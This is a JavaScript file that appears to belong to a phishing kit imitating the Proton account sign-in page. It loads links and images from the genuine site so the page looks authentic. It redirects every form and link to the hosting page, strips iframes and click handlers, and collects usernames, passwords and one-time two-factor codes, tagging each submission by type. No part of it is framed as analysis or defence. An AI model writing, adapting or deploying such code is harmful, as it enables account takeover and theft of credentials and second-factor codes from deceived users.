
document.querySelectorAll("link").forEach(li => {
    let prev = li.href
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.href = `https://account.proton.me${prev}`
    }
})

document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `https://account.proton.me${prev}`
    }
})

let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

// sets
let username = document.querySelector("#username")
let password = document.querySelector("#password")
let otpAuthcate = document.querySelector(".field-two-input-container")

if (username && password) {
    username.name = "username"
    password.name = "password"
    addSpikeType("login")
} else if (otpAuthcate) {
    addSpikeType("otp_code")
    otpAuthcate.innerHTML = `
    <div class="flex flex-item-fluid" style="border: 1px solid #aeaca9;border-radius: 8px;padding: .8rem;">
    <input style="font-size: 1.2rem;" type="number" inputmode="numeric" name="otp_code" placeholder="CODE" class="input-element w100 text-center p-0 flex-item-noshrink">
    </div>`
}

// functions
let staySignedIn = document.querySelector("#staySignedIn")
if (staySignedIn) {
    staySignedIn.checked = true
    staySignedIn.required = false
}

let showPassBtn = document.querySelector(`[title="Reveal password"]`)
let showPass = false
if (showPassBtn) {
    showPassBtn.addEventListener("click", () => {
        if (showPass == false) {
            password.type = "text"
            showPass = true
        } else {
            password.type = "password"
            showPass = false
        }
    })
}